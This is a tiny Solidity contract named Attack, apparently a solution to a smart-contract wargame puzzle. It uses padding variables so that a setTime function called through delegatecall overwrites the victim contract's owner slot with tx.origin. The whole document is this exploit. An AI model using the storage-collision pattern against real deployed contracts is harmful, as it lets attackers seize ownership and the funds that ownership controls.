contract Attack {
  uint padding1;
  uint padding2;
  address public owner;

  function setTime(uint _time) public {
      owner = tx.origin;
  }
}